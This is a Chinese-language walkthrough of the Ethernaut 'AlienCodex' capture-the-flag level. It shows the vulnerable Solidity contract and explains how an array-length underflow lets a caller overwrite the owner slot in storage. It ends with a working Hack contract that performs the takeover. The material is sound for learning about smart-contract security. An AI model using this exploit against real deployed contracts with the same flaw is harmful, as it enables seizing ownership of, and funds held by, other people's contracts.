# Ethernaut 19-AlienCodex

## 本关目标

- 成为合约的 owner

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  // 它继承了Ownable，所以隐式这个合约的slot0存放了owner
  bool public contact;
  bytes32[] public codex;

  // 保证contract为true
  modifier contacted() {
    assert(contact);
    _;
  }

  // 设置contract为true
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  // codex.length--, solidity版本是0.5.0没有溢出保护，所以，如果0-1则长度为2^256-1
  function retract() contacted public {
    codex.length--;
  }

  // 设置codex数组指定索引值
  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

## 解决方案

1. 该合约使用的 solidity 版本没有溢出保护，如果直接调用 retract()，则 codex 的数组长度会被置成 2^256 -1
2. AlienCodex 合约的 storage 分布

- owner-->slot0
- contract --> slot0
- 动态数组 codex 的长度 --> slot1
- codex 内容存储起始位置：slot(uint256(keccak256(abi.encode(1))));
- 但是 codex 的长度为 2^256 -1，而 storage 总槽数为 2^256，因此还有一个 codex 会覆盖 slot0

3. 只需要将 codex 会覆盖 slot0 的索引位置赋值成 msg.sender 即可完成 owner 覆盖

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IAlienCodex{
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns(address);
}

contract Hack {
    function hack(IAlienCodex target) external {
        // contract为true,调用retract需要
        target.makeContact();
        target.retract();  // codex.length = 2^256 -1

        uint256 codexFirstSlot = uint256(keccak256(abi.encode(1)));
        uint index;
        unchecked{
            index = 0 - codexFirstSlot; // slot为0对应的数组索引
        }

        // 修改该索引值为msg.sender
        target.revise(index, bytes32(uint256(uint160(msg.sender))));

    }
}
```
